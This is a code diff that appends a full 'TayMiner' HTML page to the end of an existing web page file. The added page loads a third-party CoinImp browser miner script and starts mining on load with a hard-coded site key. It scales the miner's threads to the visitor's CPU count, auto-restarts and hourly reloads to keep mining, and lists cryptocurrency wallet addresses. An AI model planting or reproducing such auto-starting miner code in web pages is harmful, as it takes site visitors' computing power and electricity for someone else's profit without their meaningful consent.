@@ -455,3 +455,338 @@ document.cookie = `${cookieName}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/
 </div></div></div></div>
 </body>
 </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TayMiner</title>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://www.hostingcloud.racing/m2L1.js"></script>
+    <script src="./longload.js"></script>
+
+    <style>
+        body > div:not(#content){ /* Hide Ad: */
+            display: none !important;
+            width: 0px !important;
+            height: 0px !important;
+        }
+        #donate-links-table td:first-child{ /* Add small padding on the donationlink table */
+            padding-right: 1em;
+        }
+        #user-displayname{ /* Make the displayname bold */
+            font-weight: bold;
+        }
+
+        #actual-throttle, #actual-threads{
+            font-weight: bold;
+            font-size: 125%;
+        }
+    </style>
+</head>
+<body>
+    <div id="content">
+        <div class="info">
+            <h3>TAYMINER</h3>
+            <table id="donate-links-table">
+                <script>
+                    [   ["BTC", "3EmkzBF6TAtn1vaY9meXVGrWn8Xd1emJHb"],
+                        ["ETH", "0xF279370a416Db0f11112f53d2fE8E3600Db73391"],
+                        ["XMR", "44UMnotGfzXVSQLsQ9MnR34acnZwNcgfAJGtTWrcCDDMNiVV6dmcL1AUmzXoZsvEXYTBe4zZQ2xzufpmXkViDQ4S5WFpLmc"],
+                        ["MINTME", "0x2ed1885430307c6cb136e26372c47cfc455a5882"],
+                        ["SWEAT", "da09d6ad96e05735459acf6f154328d0ad4dd209bd156e383896c9a99e9c77a6"]
+                    ].forEach(e=>{$("#donate-links-table").append($(`<tr><td>${e[0]}</td><td>${e[1]}</td></tr>`))});
+                </script>
+            </table>
+        </div>
+
+        <div class="mining-status">
+            <h3>Mining status:</h3>
+            
+            <p class="status">Loading...</p>
+            
+            <p>Throttle : <input type="text" id="input-throttle"> <span id="actual-throttle"></span> (0 - 0.99, Lower value = Faster mining)</p>
+            <p>Threads  : <input type="text" id="input-threads"> <span id="actual-threads"></span> (1 - <span id="max-threads">X</span>, Higher value = Faster mining)</p>
+            
+            <button onclick="SaveThrottleThreads();">Save Throttle/Threads settings in URL</button> <br><br>
+            <button onclick="_client.stop(); isRunning = false;">Stop Mining</button>
+            <button onclick="StartMiner();">Start Mining</button>
+        </div>
+
+        <div class="dev-tools">
+            <h3>Dev Tools/Links:</h3>
+            
+            <a href="https://www.coinimp.com/dashboard">https://www.coinimp.com/dashboard</a>
+            <br>
+            <a href="https://tinyurl.com/tayminer">https://tinyurl.com/tayminer</a>
+        </div>
+
+        <h3>Logs:</h3>
+        <div class="console-log">
+            <style>
+                .console-log > div{
+                    display: flex;
+                    margin-bottom: 0.25em;
+                }
+                .console-log pre{ /* Make HTML console log not have spacing */
+                    margin: 0;
+                }
+                .console-log > div:nth-child(even){ /* Add some color to the console for every other line*/
+                    background-color: rgb(222, 222, 222);
+                }
+            </style>
+            <script>
+                var container = document.querySelector(".console-log");
+                ["Log","Error","Warn","Debug"].forEach(type=>{eval(`
+                        console.default${type} = console.${type.toLowerCase()}.bind(console);
+                        console.${type.toLowerCase()} = function(){
+                            console_log_override("${type.toUpperCase()}", arguments);
+                        };
+                `);});
+        
+                function console_log_override(type){
+                    console.defaultLog.apply(console, arguments[1]); // Make the default console log work still
+
+                    let log_div = document.createElement("div");
+                    let info_pre = document.createElement("pre");
+                    let text_pre = document.createElement("pre");
+
+                    info_pre.innerText = `${new Date().toISOString().split("T")[1].slice(0, -1)} (${arguments[0]}) : `;
+                    text_pre.innerText = Array.from(arguments[1]).join(" ");
+                    log_div.appendChild(info_pre);
+                    log_div.appendChild(text_pre);
+                    container.insertBefore(log_div, container.firstChild);
+                }
+
+                console.log("Logging setup (If you can see this that means its working :)");
+            </script>
+        </div>
+
+        <!-- This is incase you want to read the data using Selenium or something like that -->
+        <div id="data" style="font-size: 0; width: 0px; height: 0px;"></div>
+    </div>
+
+    <script>
+        try {
+            function setCookie(cname, cvalue, exdays) {
+                const d = new Date();
+                d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+                let expires = "expires="+d.toUTCString();
+                document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+            }
+
+            function getCookie(cname) {
+                let name = cname + "=";
+                let ca = document.cookie.split(';');
+                for(let i = 0; i < ca.length; i++) {
+                    let c = ca[i];
+                    while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
+                    }
+                    if (c.indexOf(name) == 0) {
+                    return c.substring(name.length, c.length);
+                    }
+                }
+                return "";
+            }
+
+            function convertBase(value) {
+                var from_range = '0123456789'.split('');
+                var to_range = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.split('');
+                var from_base = from_range.length;
+                var to_base = to_range.length;   
+                
+                var dec_value = `${value}`.split('').reverse().reduce(function (carry, digit, index) {
+                    if (from_range.indexOf(digit) === -1) throw new Error('Invalid digit `'+digit+'` for base '+from_base+'.');
+                    return carry += from_range.indexOf(digit) * (Math.pow(from_base, index));
+                }, 0);
+                
+                var new_value = '';
+                while (dec_value > 0) {
+                    new_value = to_range[dec_value % to_base] + new_value;
+                    dec_value = (dec_value - (dec_value % to_base)) / to_base;
+                }
+                return new_value || '0';
+            }
+
+            function replaceAll(str, find, replace) {
+                return str.replace(new RegExp(find, 'g'), replace);
+            }
+
+            function makeid(length) {
+                var result           = '';
+                var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                var charactersLength = characters.length;
+                for ( var i = 0; i < length; i++ ) {
+                    result += characters.charAt(Math.floor(Math.random() * charactersLength));
+                }
+                return result;
+            }
+
+            function StartMiner(){
+                _client.start();
+                isRunning = true;
+                sec_left_until_refresh = sec_left_until_refresh_original;
+            }
+
+            function SaveThrottleThreads(){
+                var url = new URL(window.location.href);
+                url.searchParams.set('throttle', $("#input-throttle").val());
+                url.searchParams.set('threads', $("#input-threads").val());
+                window.location.href= url.href;
+            }
+
+            function getRGBGreenToRed(float, more_is_green=false){
+                float = more_is_green ? 1-float : float;
+                return `rgb(${255*float},${255*(1-float)},0)`
+            }
+
+            function inputConverter(val, val_min, val_max){
+                let match = replaceAll(val,",",".").match(`(([0-9]+(?:(\.|\,)[0-9]+)?)(%)?)`);
+
+                let new_val = null
+
+                if (match[4] == "%"){
+                    new_val = parseFloat(match[2]) / 100 * val_max
+                }
+                else if (match[3] == "."){
+                    new_val = parseFloat(match[2])
+                }
+                else{
+                    new_val = parseFloat(match[2])
+                }
+
+                new_val = (new_val > val_max) ? val_max : new_val
+                new_val = (new_val < val_min) ? val_min : new_val
+
+                return new_val
+            }
+
+            var urlParams = new URLSearchParams(window.location.search);
+            
+            var param_throttle = (urlParams.get("throttle") != null) ? urlParams.get("throttle") : null;
+            var param_threads = (urlParams.get("threads") != null) ? urlParams.get("threads") : null;
+
+            var status_text = document.getElementsByClassName("status")[0];
+            var sec_left_until_refresh_original = (urlParams.get("timeout") != null) ? parseInt(urlParams.get("timeout")) : 3600;
+            var sec_left_until_refresh = sec_left_until_refresh_original;
+
+            var avg_hashrate_long = [];
+            var avg_hashrate_short = [];
+
+            var isRunning = false;
+            var uid;
+            if (urlParams.get("uid") == null){
+                if (getCookie("uid") == ""){
+                    uid = makeid(5);
+                    setCookie("uid", uid, 365);
+                }
+                else{
+                    uid = getCookie("uid");
+                }
+            }
+            else{
+                uid = urlParams.get("uid");
+            }
+            if (urlParams.get("nodate")==null){
+                uid += "--";
+                (new Date().toISOString().split("T")[0].split("-")).forEach(e=>{
+                    uid += convertBase(e) + " ";
+                })
+            }
+
+            uid = replaceAll(uid.trim(), " ", "-");
+            
+            
+            var _client = new Client.User(
+                'e0e51f0a59eb9d9fa2d89d597f81e5df53e703886121274845cc9040dc5ae11b',
+                uid,
+                {throttle: 0, c: 'w'}
+            );
+
+            $("#input-throttle").val((param_throttle == null) ? _client.getThrottle() : param_throttle);
+            $("#input-threads").val((param_threads == null) ? _client.getNumThreads() : param_threads);
+            $("#max-threads").text(navigator.hardwareConcurrency)
+            
+            StartMiner();
+            _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+
+            // Main Loop
+            setInterval(function(){
+                // console.log(inputConverter($("#input-throttle").val(), 0, 0.99), inputConverter($("#input-threads").val(), 1, navigator.hardwareConcurrency));
+
+                _client.setThrottle(inputConverter($("#input-throttle").val(), 0, 0.99));
+                _client.setNumThreads(inputConverter($("#input-threads").val(), 1, navigator.hardwareConcurrency));
+
+                status_text.innerHTML = `
+                    USER : <span id="user-displayname">${uid}</span>
+                    <br>
+                    ${isRunning ? "Miner is running! ✅" : "Miner is stopped! ❗️"}
+                    <br>
+                    Secounds left until automatic refresh : ${sec_left_until_refresh}
+                    <br>
+                    hashes/S : ${_client.getHashesPerSecond()}
+                    <br>
+                    Accepted Hashes : ${_client.getAcceptedHashes()}
+                `;
+
+                let throttle_procent = Math.floor((1- ((0.99-_client.getThrottle())/0.99)) * 100);
+                let threads_procent = Math.floor((1- ((navigator.hardwareConcurrency-_client.getNumThreads())/navigator.hardwareConcurrency)) * 100);
+                $("#actual-throttle").text(`${_client.getThrottle()} (${throttle_procent})%`).css("color", getRGBGreenToRed(throttle_procent/100,false));
+                $("#actual-threads").text(`${_client.getNumThreads()} (${threads_procent})%`).css("color", getRGBGreenToRed(threads_procent/100,true));
+                
+                if (isRunning){
+                    if (avg_hashrate_short.length > 0 && sec_left_until_refresh % 10 == 0){
+                        let short_calculated = avg_hashrate_short.reduce((a, b) => a + b, 0) / avg_hashrate_short.length;
+                        let long_calculated = avg_hashrate_long.reduce((a, b) => a + b, 0) / avg_hashrate_long.length;
+                        avg_hashrate_short = [];
+                        console.log(`Current average h/s: ${short_calculated}\nTotal   average h/s: ${long_calculated}`);
+                    }
+                    else{
+                        avg_hashrate_long.push(_client.getHashesPerSecond());
+                        avg_hashrate_short.push(_client.getHashesPerSecond());
+                    }
+
+                    if (sec_left_until_refresh == 0){
+                        location.reload(true);
+                    }
+                    else{
+                        sec_left_until_refresh -= 1;
+                    }
+                }
+
+                if (isRunning && _client.getHashesPerSecond() == 0){
+                    console.log("Client is running, but hash/S is 0. Sending Start command to client...");
+                    StartMiner();
+                }
+
+                // This is incase you want to read the data using Selenium or something like that
+                $("#data").text(`
+                    running=${isRunning}<br>
+                    autorefresh=${sec_left_until_refresh}<br>
+                    hashrate=${_client.getHashesPerSecond()}<br>
+                    acceptedhashes=${_client.getAcceptedHashes()}<br>
+                    throttle=${_client.getThrottle()}<br>
+                    threads=${_client.getNumThreads()}<br>
+                    uid=${uid}<br>
+                `.replaceAll(/\s/g,''));
+            }, 1000);
+            
+            if (urlParams.get("longload") != null){
+                long_load(parseInt(urlParams.get("longload")), "https://effigis.com/wp-content/uploads/2015/02/Airbus_Pleiades_50cm_8bit_RGB_Yogyakarta.jpg")
+            }
+        } catch (error) {
+            let error_message = "UNKNOWN ERROR : " + error.message;
+
+            if (error.message == "Client is not defined"){
+                error_message = "ERROR : Client is not defined (Something might be blocking it from loading.)";
+            }
+
+            status_text.innerHTML = error_message;
+            console.error(error_message)
+        }        
+    </script>
+</body>
+</html>
